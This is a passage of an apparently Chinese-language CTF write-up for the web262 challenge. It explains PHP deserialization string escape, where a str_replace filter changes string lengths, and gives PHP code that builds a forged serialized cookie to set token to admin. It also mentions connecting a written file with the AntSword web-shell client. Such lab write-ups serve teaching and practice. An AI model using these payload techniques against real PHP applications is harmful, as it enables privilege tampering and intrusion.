class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>这里写入一个文件，用蚁剑连接</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304115732681.png\" alt=\"image-20230304115732681\" /></p>\n<h2 id=\"web262\"><a class=\"anchor\" href=\"#web262\">#</a> web262</h2>\n<p>index.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'m'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$t</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'t'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token variable\">$umsg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">,</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$umsg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Your message has been sent'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>message.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>有替换很明显，考察字符串逃逸，这里先简单说一下什么是字符串逃逸</p>\n<h3 id=\"反序列化字符串逃逸\"><a class=\"anchor\" href=\"#反序列化字符串逃逸\">#</a> 反序列化字符串逃逸</h3>\n<h4 id=\"增加\"><a class=\"anchor\" href=\"#增加\">#</a> 增加</h4>\n<p>这个点在我上面的文章中没有说到，当时没想起来还有这个点，这个知识点也不麻烦，就简单的说明一下</p>\n<p>php 序列化后的格式是固定的</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$passwd</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"O:4:\\\"demo\\\":2:&#123;s:8:\\\"username\\\";s:5:\\\"admin\\\";s:6:\\\"passwd\\\";s:4:\\\"test\\\";&#125;aaaaaaaaaaaaaaaaaaaaaaaa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"O:4:\\\"demo\\\":2:&#123;s:8:\\\"username123\\\";s:5:\\\"admin\\\";s:6:\\\"passwd\\\";s:4:\\\"test\\\";&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304134324287.png\" alt=\"image-20230304134324287\" /></p>\n<p>这里把下面的 username 加上了 123，这里长度与前面的 8 不对应就报错，后面加上的 aaaaaaaa 不影响反序列化的结果</p>\n<p>为什么上面说有替换猜测是字符串逃逸呢？</p>\n<p>这里假如我需要更改 passwd 为 admin，不去改动 $passwd 怎么做到呢？</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\\\";s:6:\\\"passwd\\\";s:5:\\\"admin\\\";&#125;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$passwd</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304133733733.png\" alt=\"image-20230304133733733\" /></p>\n<p>看上面的结果，这里 passwd 已经被改为了 admin，很简单的逻辑，在前一个变量后面添加上 &quot;;s:6:&quot;passwd&quot;;s:5:&quot;admin&quot;;}, 这是我们构造的 passwd 预取为 admin 的序列化后的结果，通过</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这一句会讲 fuck 替换为 loveU，每有一个 fuck 就会使得前一个变量的长度加一，当我们长度等于我们构造的 &quot;;s:6:&quot;passwd&quot;;s:5:&quot;admin&quot;;}，这里就会顶替掉原有的&quot;;s:6:&quot;passwd&quot;;s:4:&quot;test&quot;;}</p>\n<h4 id=\"减少\"><a class=\"anchor\" href=\"#减少\">#</a> 减少</h4>\n<p>原理还是跟增加得到一样，不过是我们构造的字符添加的位置不同</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$passwd</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'you'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$d</span><span class=\"token operator\">=</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\\";s:6:\\\"passwd\\\";s:5:\\\"admin\\\";&#125;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$d</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"youyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyou\\\";s:6:\\\"passwd\\\";s:5:\\\"admin\\\";&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304135322961.png\" alt=\"image-20230304135322961\" /></p>\n<p>现在做这个就简单了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$t</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\\\";s:5:\\\"token\\\";s:5:\\\"admin\\\";&#125;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>O:7:\"message\":4:&#123;s:4:\"from\";s:1:\"1\";s:3:\"msg\";s:1:\"1\";s:2:\"to\";s:136:\"1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";&#125;\";s:5:\"token\";s:5:\"admin\";&#125;</pre></td></tr><tr><td 